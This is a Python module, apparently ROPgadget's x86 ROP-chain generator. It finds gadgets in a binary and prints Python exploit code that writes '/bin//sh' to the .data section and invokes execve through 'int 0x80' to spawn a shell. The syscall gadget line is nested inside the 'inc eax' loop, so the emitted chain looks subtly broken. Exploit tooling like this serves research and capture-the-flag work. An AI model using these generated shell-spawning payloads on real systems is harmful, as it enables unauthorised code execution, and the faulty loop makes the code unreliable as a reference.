import re
from struct import pack


class ROPMakerX86:
    def __init__(self, data_section, gadgets, liboffset=0x0):
        self.__gadgets = gadgets
        self.__data_section = data_section
        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search(
                "mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$",
                f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        padding_code = ''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    padding_code += (
                        "\tp += pack('<I', 0x%08x) # padding without overwrite %s\n" % (regAlreadSetted[reg], reg))
                except KeyError:
                    padding_code += "\tp += pack('<I', 0x41414141) # padding\n"
        return padding_code

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
        section = self.__data_section
        dataAddr = section["vaddr"] + self.__liboffset
        payload_code = ''
        payload_code += "\t#!/usr/bin/env python2\n"
        payload_code += "\t# execve generated by ROPgadget\n\n"
        payload_code += "\tfrom struct import pack\n\n"

        payload_code += "\t# Padding goes here\n"
        payload_code += "\tp = ''\n\n"

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data\n" % dataAddr)
        payload_code += self.__padding(popDst, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popSrc["vaddr"], popSrc["gadget"]))
        payload_code += "\tp += '/bin'\n"
        payload_code += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        payload_code += self.__padding(write4where, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data + 4\n" % (dataAddr + 4))
        payload_code += self.__padding(popDst, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popSrc["vaddr"], popSrc["gadget"]))
        payload_code += "\tp += '//sh'\n"
        payload_code += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        payload_code += self.__padding(write4where, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data + 8\n" % (dataAddr + 8))
        payload_code += self.__padding(popDst, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (xorSrc["vaddr"], xorSrc["gadget"]))
        payload_code += self.__padding(xorSrc, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        payload_code += self.__padding(write4where, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popEbx["vaddr"], popEbx["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data\n" % dataAddr)
        payload_code += self.__padding(popEbx, {})

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popEcx["vaddr"], popEcx["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data + 8\n" % (dataAddr + 8))
        payload_code += self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (popEdx["vaddr"], popEdx["gadget"]))
        payload_code += ("\tp += pack('<I', 0x%08x) # @ .data + 8\n" % (dataAddr + 8))
        payload_code += self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (xorEax["vaddr"], xorEax["gadget"]))
        payload_code += self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        for i in range(11):
            payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (incEax["vaddr"], incEax["gadget"]))
            payload_code += self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

            payload_code += ("\tp += pack('<I', 0x%08x) # %s\n" % (syscall["vaddr"], syscall["gadget"]))
        return payload_code

    def generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                print("\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")
                return

            popDst = self.__lookingForSomeThing("pop %s" % (write4where[1]))
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[1]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % (write4where[2]))
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (
                    write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print("\t[-] Can't find the 'xor eax, eax' instuction")
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print("\t[-] Can't find the 'inc eax' instuction")
            return

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            print("\t[-] Can't find the 'pop ebx' instruction")
            return

        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            print("\t[-] Can't find the 'pop ecx' instruction")
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            print("\t[-] Can't find the 'pop edx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")

        payload_code = self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx,
                                            popEdx, syscall)
        return payload_code
